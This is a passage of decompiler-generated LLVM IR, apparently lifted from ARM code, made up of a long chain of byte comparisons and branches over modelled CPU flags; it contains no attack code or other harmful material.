
bb1573:                                           ; preds = %bb1572
  store i32 %v4_f194, i32* %r3.global-to-local, align 4
  br label %thread-pre-split201

thread-pre-split201:                              ; preds = %bb1572, %bb1573
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f198 = icmp eq i32 %v4_f194, 0
  store i1 %v2_f198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f198, label %dec_label_pc_f1a8, label %dec_label_pc_f1a0

dec_label_pc_f1a0:                                ; preds = %thread-pre-split201
  %v2_f1a0 = icmp ugt i32 %v1_e870, 225
  store i1 %v2_f1a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f1a0 = icmp eq i32 %v1_e870, 226
  store i1 %v7_f1a0, i1* %cpsr_z.global-to-local, align 1
  %v2_f1a4 = xor i1 %v2_f1a0, true
  %v3_f1a4 = or i1 %v7_f1a0, %v2_f1a4
  br i1 %v3_f1a4, label %dec_label_pc_e858, label %dec_label_pc_f1a8

dec_label_pc_f1a8:                                ; preds = %dec_label_pc_f1a0, %thread-pre-split201
  store i32 %.1988, i32* %r3.global-to-local, align 4
  store i32 %v0_ef44, i32* %r4.global-to-local, align 4
  %v2_f1b0 = and i32 %v0_ef44, %.1988
  %v4_f1b0 = icmp eq i32 %v2_f1b0, 0
  store i1 %v4_f1b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f1b0, label %dec_label_pc_f1c0, label %dec_label_pc_f1b8

dec_label_pc_f1b8:                                ; preds = %dec_label_pc_f1a8
  %v2_f1b8 = icmp ugt i32 %v1_e870, 45
  store i1 %v2_f1b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f1b8 = icmp eq i32 %v1_e870, 46
  store i1 %v7_f1b8, i1* %cpsr_z.global-to-local, align 1
  %v2_f1bc = xor i1 %v2_f1b8, true
  %v3_f1bc = or i1 %v7_f1b8, %v2_f1bc
  br i1 %v3_f1bc, label %dec_label_pc_e858, label %dec_label_pc_f1c0

dec_label_pc_f1c0:                                ; preds = %dec_label_pc_f1b8, %dec_label_pc_f1a8
  %v7_f1c0 = icmp eq i32 %v1_e85c, 163
  %.2015 = zext i1 %v7_f1c0 to i32
  store i32 %.2015, i32* @sb, align 4
  %v2_f1cc = icmp ugt i32 %v1_e870, 203
  store i1 %v2_f1cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f1cc = icmp eq i32 %v1_e870, 204
  store i1 %v7_f1cc, i1* %cpsr_z.global-to-local, align 1
  %v2_f1d0 = xor i1 %v2_f1cc, true
  %v3_f1d0 = or i1 %v7_f1cc, %v2_f1d0
  br i1 %v3_f1d0, label %bb1576, label %bb1577

bb1576:                                           ; preds = %dec_label_pc_f1c0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1577

bb1577:                                           ; preds = %dec_label_pc_f1c0, %bb1576
  %v0_f1d8.pr = phi i32 [ %.1988, %dec_label_pc_f1c0 ], [ 0, %bb1576 ]
  %v2_f1d4 = xor i1 %v7_f1cc, true
  %v3_f1d4 = and i1 %v2_f1cc, %v2_f1d4
  br i1 %v3_f1d4, label %bb1578, label %thread-pre-split203

bb1578:                                           ; preds = %bb1577
  store i32 %.2015, i32* %r3.global-to-local, align 4
  br label %thread-pre-split203

thread-pre-split203:                              ; preds = %bb1577, %bb1578
  %v0_f1d8 = phi i32 [ %.2015, %bb1578 ], [ %v0_f1d8.pr, %bb1577 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f1d8 = icmp eq i32 %v0_f1d8, 0
  store i1 %v2_f1d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f1d8, label %dec_label_pc_f1e8, label %dec_label_pc_f1e0

dec_label_pc_f1e0:                                ; preds = %thread-pre-split203
  %v2_f1e0 = icmp ugt i32 %v1_e870, 205
  store i1 %v2_f1e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f1e0 = icmp eq i32 %v1_e870, 206
  store i1 %v7_f1e0, i1* %cpsr_z.global-to-local, align 1
  %v2_f1e4 = xor i1 %v2_f1e0, true
  %v3_f1e4 = or i1 %v7_f1e0, %v2_f1e4
  br i1 %v3_f1e4, label %dec_label_pc_e858, label %dec_label_pc_f1e8

dec_label_pc_f1e8:                                ; preds = %dec_label_pc_f1e0, %thread-pre-split203
  store i32 %v0_ef44, i32* %r3.global-to-local, align 4
  %v2_f1f0 = and i32 %v0_ef44, %.1990
  %v4_f1f0 = icmp eq i32 %v2_f1f0, 0
  store i1 %v4_f1f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f1f0, label %dec_label_pc_f200, label %dec_label_pc_f1f8

dec_label_pc_f1f8:                                ; preds = %dec_label_pc_f1e8
  %v2_f1f8 = icmp ugt i32 %v1_e870, 48
  store i1 %v2_f1f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f1f8 = icmp eq i32 %v1_e870, 49
  store i1 %v7_f1f8, i1* %cpsr_z.global-to-local, align 1
  %v2_f1fc = xor i1 %v2_f1f8, true
  %v3_f1fc = or i1 %v7_f1f8, %v2_f1fc
  br i1 %v3_f1fc, label %dec_label_pc_e858, label %dec_label_pc_f200

dec_label_pc_f200:                                ; preds = %dec_label_pc_f1f8, %dec_label_pc_f1e8
  store i32 %.1990, i32* %r3.global-to-local, align 4
  %v2_f204 = icmp ugt i32 %v1_e870, 215
  store i1 %v2_f204, i1* %cpsr_c.global-to-local, align 1
  %v7_f204 = icmp eq i32 %v1_e870, 216
  store i1 %v7_f204, i1* %cpsr_z.global-to-local, align 1
  %v2_f208 = xor i1 %v2_f204, true
  %v3_f208 = or i1 %v7_f204, %v2_f208
  br i1 %v3_f208, label %bb1579, label %bb1580

bb1579:                                           ; preds = %dec_label_pc_f200
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1580

bb1580:                                           ; preds = %dec_label_pc_f200, %bb1579
  %v4_f20c = phi i32 [ %.1990, %dec_label_pc_f200 ], [ 0, %bb1579 ]
  %v2_f20c = xor i1 %v7_f204, true
  %v3_f20c = and i1 %v2_f204, %v2_f20c
  br i1 %v3_f20c, label %bb1581, label %thread-pre-split204

bb1581:                                           ; preds = %bb1580
  store i32 %v4_f20c, i32* %r3.global-to-local, align 4
  br label %thread-pre-split204

thread-pre-split204:                              ; preds = %bb1580, %bb1581
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f210 = icmp eq i32 %v4_f20c, 0
  store i1 %v2_f210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f210, label %dec_label_pc_f220, label %dec_label_pc_f218

dec_label_pc_f218:                                ; preds = %thread-pre-split204
  %v2_f218 = icmp ugt i32 %v1_e870, 231
  store i1 %v2_f218, i1* %cpsr_c.global-to-local, align 1
  %v7_f218 = icmp eq i32 %v1_e870, 232
  store i1 %v7_f218, i1* %cpsr_z.global-to-local, align 1
  %v2_f21c = xor i1 %v2_f218, true
  %v3_f21c = or i1 %v7_f218, %v2_f21c
  br i1 %v3_f21c, label %dec_label_pc_e858, label %dec_label_pc_f220

dec_label_pc_f220:                                ; preds = %dec_label_pc_f218, %thread-pre-split204
  store i32 %.2003, i32* %r3.global-to-local, align 4
  %v2_f224 = icmp ugt i32 %v1_e870, 250
  store i1 %v2_f224, i1* %cpsr_c.global-to-local, align 1
  %v7_f224 = icmp eq i32 %v1_e870, 251
  store i1 %v7_f224, i1* %cpsr_z.global-to-local, align 1
  %v2_f228 = xor i1 %v2_f224, true
  %v3_f228 = or i1 %v7_f224, %v2_f228
  br i1 %v3_f228, label %bb1582, label %bb1583

bb1582:                                           ; preds = %dec_label_pc_f220
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1583

bb1583:                                           ; preds = %dec_label_pc_f220, %bb1582
  %v4_f22c = phi i32 [ %.2003, %dec_label_pc_f220 ], [ 0, %bb1582 ]
  %v2_f22c = xor i1 %v7_f224, true
  %v3_f22c = and i1 %v2_f224, %v2_f22c
  br i1 %v3_f22c, label %bb1584, label %thread-pre-split205

bb1584:                                           ; preds = %bb1583
  store i32 %v4_f22c, i32* %r3.global-to-local, align 4
  br label %thread-pre-split205

thread-pre-split205:                              ; preds = %bb1583, %bb1584
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f230 = icmp eq i32 %v4_f22c, 0
  store i1 %v2_f230, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f230, label %dec_label_pc_f240, label %dec_label_pc_f238

dec_label_pc_f238:                                ; preds = %thread-pre-split205
  %v2_f238 = icmp ugt i32 %v1_e870, 252
  store i1 %v2_f238, i1* %cpsr_c.global-to-local, align 1
  %v7_f238 = icmp eq i32 %v1_e870, 253
  store i1 %v7_f238, i1* %cpsr_z.global-to-local, align 1
  %v2_f23c = xor i1 %v2_f238, true
  %v3_f23c = or i1 %v7_f238, %v2_f23c
  br i1 %v3_f23c, label %dec_label_pc_e858, label %dec_label_pc_f240

dec_label_pc_f240:                                ; preds = %dec_label_pc_f238, %thread-pre-split205
  %v7_f240 = icmp eq i32 %v1_e85c, 199
  %.2016 = zext i1 %v7_f240 to i32
  store i32 %.2016, i32* %r4.global-to-local, align 4
  store i32 %.2016, i32* %r3.global-to-local, align 4
  store i1 %v2_ec88, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec88, i1* %cpsr_z.global-to-local, align 1
  %v2_f254 = xor i1 %v2_ec88, true
  %v3_f254 = or i1 %v7_ec88, %v2_f254
  br i1 %v3_f254, label %bb1587, label %bb1588

bb1587:                                           ; preds = %dec_label_pc_f240
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1588

bb1588:                                           ; preds = %dec_label_pc_f240, %bb1587
  %v4_f258 = phi i32 [ %.2016, %dec_label_pc_f240 ], [ 0, %bb1587 ]
  %v2_f258 = xor i1 %v7_ec88, true
  %v3_f258 = and i1 %v2_ec88, %v2_f258
  br i1 %v3_f258, label %bb1589, label %thread-pre-split207

bb1589:                                           ; preds = %bb1588
  store i32 %v4_f258, i32* %r3.global-to-local, align 4
  br label %thread-pre-split207

thread-pre-split207:                              ; preds = %bb1588, %bb1589
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f25c = icmp eq i32 %v4_f258, 0
  store i1 %v2_f25c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f25c, label %dec_label_pc_f270, label %dec_label_pc_f268

dec_label_pc_f268:                                ; preds = %thread-pre-split207
  %v2_f268 = icmp ugt i32 %v1_e870, 252
  store i1 %v2_f268, i1* %cpsr_c.global-to-local, align 1
  %v7_f268 = icmp eq i32 %v1_e870, 253
  store i1 %v7_f268, i1* %cpsr_z.global-to-local, align 1
  %v2_f26c = xor i1 %v2_f268, true
  %v3_f26c = or i1 %v7_f268, %v2_f26c
  br i1 %v3_f26c, label %dec_label_pc_e858, label %dec_label_pc_f270

dec_label_pc_f270:                                ; preds = %dec_label_pc_f268, %thread-pre-split207
  store i32 %v0_fed0, i32* %r3.global-to-local, align 4
  %v2_f274 = icmp ugt i32 %v1_e85c, 204
  store i1 %v2_f274, i1* %cpsr_c.global-to-local, align 1
  %v7_f274 = icmp eq i32 %v1_e85c, 205
  store i1 %v7_f274, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f274, label %.thread208, label %.thread209

.thread209:                                       ; preds = %dec_label_pc_f270
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f290

.thread208:                                       ; preds = %dec_label_pc_f270
  store i32 %v0_fed0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f280 = icmp eq i32 %v0_fed0, 0
  store i1 %v2_f280, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f280, label %dec_label_pc_f290, label %dec_label_pc_f288

dec_label_pc_f288:                                ; preds = %.thread208
  %v2_f288 = icmp ugt i32 %v1_e870, 116
  store i1 %v2_f288, i1* %cpsr_c.global-to-local, align 1
  %v7_f288 = icmp eq i32 %v1_e870, 117
  store i1 %v7_f288, i1* %cpsr_z.global-to-local, align 1
  %v2_f28c = xor i1 %v2_f288, true
  %v3_f28c = or i1 %v7_f288, %v2_f28c
  br i1 %v3_f28c, label %dec_label_pc_e858, label %dec_label_pc_f290

dec_label_pc_f290:                                ; preds = %.thread209, %dec_label_pc_f288, %.thread208
  store i32 %.1996, i32* %r3.global-to-local, align 4
  store i1 %v2_ebd8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ebd8, i1* %cpsr_z.global-to-local, align 1
  %v2_f298 = xor i1 %v2_ebd8, true
  %v3_f298 = or i1 %v7_ebd8, %v2_f298
  br i1 %v3_f298, label %bb1590, label %bb1591

bb1590:                                           ; preds = %dec_label_pc_f290
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1591

bb1591:                                           ; preds = %dec_label_pc_f290, %bb1590
  %v4_f29c = phi i32 [ %.1996, %dec_label_pc_f290 ], [ 0, %bb1590 ]
  %v2_f29c = xor i1 %v7_ebd8, true
  %v3_f29c = and i1 %v2_ebd8, %v2_f29c
  br i1 %v3_f29c, label %bb1592, label %thread-pre-split212

bb1592:                                           ; preds = %bb1591
  store i32 %v4_f29c, i32* %r3.global-to-local, align 4
  br label %thread-pre-split212

thread-pre-split212:                              ; preds = %bb1591, %bb1592
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f2a0 = icmp eq i32 %v4_f29c, 0
  store i1 %v2_f2a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f2a0, label %dec_label_pc_f2b0, label %dec_label_pc_f2a8

dec_label_pc_f2a8:                                ; preds = %thread-pre-split212
  %v2_f2a8 = icmp ugt i32 %v1_e870, 60
  store i1 %v2_f2a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f2a8 = icmp eq i32 %v1_e870, 61
  store i1 %v7_f2a8, i1* %cpsr_z.global-to-local, align 1
  %v2_f2ac = xor i1 %v2_f2a8, true
  %v3_f2ac = or i1 %v7_f2a8, %v2_f2ac
  br i1 %v3_f2ac, label %dec_label_pc_e858, label %dec_label_pc_f2b0

dec_label_pc_f2b0:                                ; preds = %dec_label_pc_f2a8, %thread-pre-split212
  store i32 %v0_f2c0, i32* %r3.global-to-local, align 4
  %v2_f2b4 = icmp ugt i32 %v1_e85c, 103
  store i1 %v2_f2b4, i1* %cpsr_c.global-to-local, align 1
  %v7_f2b4 = icmp eq i32 %v1_e85c, 104
  %.2017 = zext i1 %v7_f2b4 to i32
  %v2_f2c0 = and i32 %v0_f2c0, %.2017
  %v4_f2c0 = icmp eq i32 %v2_f2c0, 0
  store i1 %v4_f2c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f2c0, label %dec_label_pc_f2d4, label %dec_label_pc_f2cc

dec_label_pc_f2cc:                                ; preds = %dec_label_pc_f2b0
  store i1 %v2_ec1c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_eef4, label %dec_label_pc_e858, label %dec_label_pc_f2d4

dec_label_pc_f2d4:                                ; preds = %dec_label_pc_f2cc, %dec_label_pc_f2b0
  %v7_f2d4 = icmp eq i32 %v1_e85c, 188
  %.2018 = zext i1 %v7_f2d4 to i32
  store i32 %.2018, i32* %r4.global-to-local, align 4
  %v2_f2e0 = icmp ugt i32 %v1_e870, 165
  store i1 %v2_f2e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f2e0 = icmp eq i32 %v1_e870, 166
  store i1 %v7_f2e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2e0, label %bb1597, label %dec_label_pc_f2f0

bb1597:                                           ; preds = %dec_label_pc_f2d4
  %v2_f2d4 = icmp ugt i32 %v1_e85c, 187
  store i1 %v2_f2d4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f2d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2d4, label %dec_label_pc_e858, label %dec_label_pc_f2f0

dec_label_pc_f2f0:                                ; preds = %dec_label_pc_f2d4, %bb1597
  store i32 %.2018, i32* %r3.global-to-local, align 4
  %v2_f2f4 = icmp ugt i32 %v1_e870, 225
  store i1 %v2_f2f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f2f4 = icmp eq i32 %v1_e870, 226
  store i1 %v7_f2f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2f4, label %.thread220, label %.thread221

.thread221:                                       ; preds = %dec_label_pc_f2f0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f308

.thread220:                                       ; preds = %dec_label_pc_f2f0
  store i32 %.2018, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f300 = icmp eq i1 %v7_f2d4, false
  store i1 %v2_f300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f300, label %dec_label_pc_f308, label %dec_label_pc_e858

dec_label_pc_f308:                                ; preds = %.thread221, %.thread220
  %v2_f308 = icmp ugt i32 %v1_e870, 202
  store i1 %v2_f308, i1* %cpsr_c.global-to-local, align 1
  %v7_f308 = icmp eq i32 %v1_e870, 203
  store i1 %v7_f308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f308, label %.thread224, label %.thread225

.thread225:                                       ; preds = %dec_label_pc_f308
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f31c

.thread224:                                       ; preds = %dec_label_pc_f308
  store i32 %.2013, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f314 = icmp eq i1 %v7_f13c, false
  store i1 %v2_f314, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f314, label %dec_label_pc_f31c, label %dec_label_pc_e858

dec_label_pc_f31c:                                ; preds = %.thread225, %.thread224
  store i32 %.1988, i32* %r3.global-to-local, align 4
  %v2_f320 = icmp ugt i32 %v1_e870, 242
  store i1 %v2_f320, i1* %cpsr_c.global-to-local, align 1
  %v7_f320 = icmp eq i32 %v1_e870, 243
  store i1 %v7_f320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f320, label %.thread228, label %.thread229

.thread229:                                       ; preds = %dec_label_pc_f31c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f334

.thread228:                                       ; preds = %dec_label_pc_f31c
  store i32 %.1988, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f32c = icmp eq i1 %v7_eac8, false
  store i1 %v2_f32c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f32c, label %dec_label_pc_f334, label %dec_label_pc_e858

dec_label_pc_f334:                                ; preds = %.thread229, %.thread228
  %v2_f338 = icmp ugt i32 %v1_e85c, 44
  store i1 %v2_f338, i1* %cpsr_c.global-to-local, align 1
  %v7_f338 = icmp eq i32 %v1_e85c, 45
  %.2019 = zext i1 %v7_f338 to i32
  %v2_f344 = and i32 %.1997, %.2019
  %v4_f344 = icmp eq i32 %v2_f344, 0
  store i1 %v4_f344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f344, label %dec_label_pc_f350, label %dec_label_pc_e858

dec_label_pc_f350:                                ; preds = %dec_label_pc_f334
  %v7_f350 = icmp eq i32 %v1_e85c, 178
  %.2020 = zext i1 %v7_f350 to i32
  store i32 %.2020, i32* %r3.global-to-local, align 4
  %v2_f35c = icmp ugt i32 %v1_e870, 61
  store i1 %v2_f35c, i1* %cpsr_c.global-to-local, align 1
  %v7_f35c = icmp eq i32 %v1_e870, 62
  %storemerge1255 = zext i1 %v7_f35c to i32
  store i32 %storemerge1255, i32* %r4.global-to-local, align 4
  %v2_f368 = and i32 %storemerge1255, %.2020
  %v4_f368 = icmp eq i32 %v2_f368, 0
  store i1 %v4_f368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f368, label %dec_label_pc_f378, label %dec_label_pc_e858

dec_label_pc_f378:                                ; preds = %dec_label_pc_f350
  store i32 %.2017, i32* %r3.global-to-local, align 4
  store i1 %v2_f170, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f170, label %.thread235, label %.thread236

.thread236:                                       ; preds = %dec_label_pc_f378
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f390

.thread235:                                       ; preds = %dec_label_pc_f378
  store i32 %.2017, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f388 = icmp eq i1 %v7_f2b4, false
  store i1 %v2_f388, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f388, label %dec_label_pc_f390, label %dec_label_pc_e858

dec_label_pc_f390:                                ; preds = %.thread236, %.thread235
  store i32 %.2017, i32* %r3.global-to-local, align 4
  %v2_f394 = icmp ugt i32 %v1_e870, 235
  store i1 %v2_f394, i1* %cpsr_c.global-to-local, align 1
  %v7_f394 = icmp eq i32 %v1_e870, 236
  store i1 %v7_f394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f394, label %.thread239, label %.thread240

.thread240:                                       ; preds = %dec_label_pc_f390
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f3a8

.thread239:                                       ; preds = %dec_label_pc_f390
  store i32 %.2017, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f3a0 = icmp eq i1 %v7_f2b4, false
  store i1 %v2_f3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f3a0, label %dec_label_pc_f3a8, label %dec_label_pc_e858

dec_label_pc_f3a8:                                ; preds = %.thread240, %.thread239
  %v7_f3a8 = icmp eq i32 %v1_e85c, 107
  %.2021 = zext i1 %v7_f3a8 to i32
  %v2_f3b4 = icmp ugt i32 %v1_e870, 169
  store i1 %v2_f3b4, i1* %cpsr_c.global-to-local, align 1
  %v7_f3b4 = icmp eq i32 %v1_e870, 170
  %storemerge1257 = zext i1 %v7_f3b4 to i32
  %v2_f3c0 = and i32 %storemerge1257, %.2021
  %v4_f3c0 = icmp eq i32 %v2_f3c0, 0
  store i1 %v4_f3c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f3c0, label %dec_label_pc_f3d0, label %dec_label_pc_e858

dec_label_pc_f3d0:                                ; preds = %dec_label_pc_f3a8
  store i32 %.2008, i32* %r3.global-to-local, align 4
  store i1 %v2_eff4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_eff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eff4, label %.thread245, label %.thread246

.thread246:                                       ; preds = %dec_label_pc_f3d0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f3e8

.thread245:                                       ; preds = %dec_label_pc_f3d0
  store i32 %.2008, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f3e0 = icmp eq i1 %v7_eeb0, false
  store i1 %v2_f3e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f3e0, label %dec_label_pc_f3e8, label %dec_label_pc_e858

dec_label_pc_f3e8:                                ; preds = %.thread246, %.thread245
  store i32 %.1992, i32* %r3.global-to-local, align 4
  store i32 %.2008, i32* %r4.global-to-local, align 4
  %v2_f3f0 = and i32 %.1992, %.2008
  %v4_f3f0 = icmp eq i32 %v2_f3f0, 0
  store i1 %v4_f3f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f3f0, label %dec_label_pc_f3f8, label %dec_label_pc_e858

dec_label_pc_f3f8:                                ; preds = %dec_label_pc_f3e8
  %v2_f400 = and i32 %.1994, %.2009
  %v4_f400 = icmp eq i32 %v2_f400, 0
  store i1 %v4_f400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f400, label %dec_label_pc_f408, label %dec_label_pc_e858

dec_label_pc_f408:                                ; preds = %dec_label_pc_f3f8
  %v2_f408 = icmp ugt i32 %v1_e870, 184
  store i1 %v2_f408, i1* %cpsr_c.global-to-local, align 1
  %v7_f408 = icmp eq i32 %v1_e870, 185
  store i1 %v7_f408, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f408, label %.thread249, label %.thread250

.thread250:                                       ; preds = %dec_label_pc_f408
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f430

.thread249:                                       ; preds = %dec_label_pc_f408
  store i32 %.1976, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f414 = icmp eq i1 %v7_e918, false
  store i1 %v2_f414, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f414, label %dec_label_pc_f430, label %dec_label_pc_f41c

dec_label_pc_f41c:                                ; preds = %.thread249
  %v2_f41c = icmp ugt i32 %v1_e874, 189
  store i1 %v2_f41c, i1* %cpsr_c.global-to-local, align 1
  %v7_f41c = icmp eq i32 %v1_e874, 190
  store i1 %v7_f41c, i1* %cpsr_z.global-to-local, align 1
  %v2_f420 = xor i1 %v7_f41c, true
  %v3_f420 = and i1 %v2_f41c, %v2_f420
  br i1 %v3_f420, label %bb1608, label %bb1609

bb1608:                                           ; preds = %dec_label_pc_f41c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1609

bb1609:                                           ; preds = %dec_label_pc_f41c, %bb1608
  %v0_f428895 = phi i32 [ %.1976, %dec_label_pc_f41c ], [ 0, %bb1608 ]
  %v2_f424 = xor i1 %v2_f41c, true
  %v3_f424 = or i1 %v7_f41c, %v2_f424
  br i1 %v3_f424, label %bb1610, label %bb1611

bb1610:                                           ; preds = %bb1609
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1611

bb1611:                                           ; preds = %bb1609, %bb1610
  %v0_f428 = phi i32 [ %v0_f428895, %bb1609 ], [ 1, %bb1610 ]
  %v2_f428 = and i32 %v3_e864, 64
  %v3_f428 = icmp ne i32 %v2_f428, 0
  store i1 %v3_f428, i1* %cpsr_c.global-to-local, align 1
  %v4_f428 = udiv i32 %v1_e874, 128
  %v5_f428 = and i32 %v0_f428, %v4_f428
  store i32 %v5_f428, i32* %r3.global-to-local, align 4
  %v6_f428 = icmp eq i32 %v5_f428, 0
  store i1 %v6_f428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_f428, label %dec_label_pc_f430, label %dec_label_pc_e858

dec_label_pc_f430:                                ; preds = %.thread250, %bb1611, %.thread249
  %v2_f430 = icmp ugt i32 %v1_e870, 46
  store i1 %v2_f430, i1* %cpsr_c.global-to-local, align 1
  %v7_f430 = icmp eq i32 %v1_e870, 47
  %.2022 = zext i1 %v7_f430 to i32
  store i32 %.2022, i32* @r6, align 4
  %v2_f43c = and i32 %.2022, %.2015
  %v4_f43c = icmp eq i32 %v2_f43c, 0
  store i1 %v4_f43c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f43c, label %dec_label_pc_f460, label %dec_label_pc_f444

dec_label_pc_f444:                                ; preds = %dec_label_pc_f430
  %v2_f444 = icmp ugt i32 %v1_e874, 8
  store i1 %v2_f444, i1* %cpsr_c.global-to-local, align 1
  %v7_f444 = icmp eq i32 %v1_e874, 9
  store i1 %v7_f444, i1* %cpsr_z.global-to-local, align 1
  %v2_f448 = xor i1 %v2_f444, true
  %v3_f448 = or i1 %v7_f444, %v2_f448
  br i1 %v3_f448, label %bb1614, label %bb1615

bb1614:                                           ; preds = %dec_label_pc_f444
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1615

bb1615:                                           ; preds = %dec_label_pc_f444, %bb1614
  %v2_f44c = xor i1 %v7_f444, true
  %v3_f44c = and i1 %v2_f444, %v2_f44c
  br i1 %v3_f44c, label %bb1616, label %bb1617

bb1616:                                           ; preds = %bb1615
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1617

bb1617:                                           ; preds = %bb1615, %bb1616
  %v0_f458.pr = phi i32 [ 0, %bb1615 ], [ 1, %bb1616 ]
  %v2_f450 = icmp ugt i32 %v1_e874, 9
  store i1 %v2_f450, i1* %cpsr_c.global-to-local, align 1
  %v7_f450 = icmp eq i32 %v1_e874, 10
  store i1 %v7_f450, i1* %cpsr_z.global-to-local, align 1
  %v2_f454 = xor i1 %v7_f450, true
  %v3_f454 = and i1 %v2_f450, %v2_f454
  br i1 %v3_f454, label %.thread255, label %bb1618

.thread255:                                       ; preds = %bb1617
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f460

bb1618:                                           ; preds = %bb1617
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f458 = icmp eq i32 %v0_f458.pr, 0
  store i1 %v2_f458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f458, label %dec_label_pc_f460, label %dec_label_pc_e858

dec_label_pc_f460:                                ; preds = %.thread255, %bb1618, %dec_label_pc_f430
  %v2_f460 = icmp ugt i32 %v1_e85c, 173
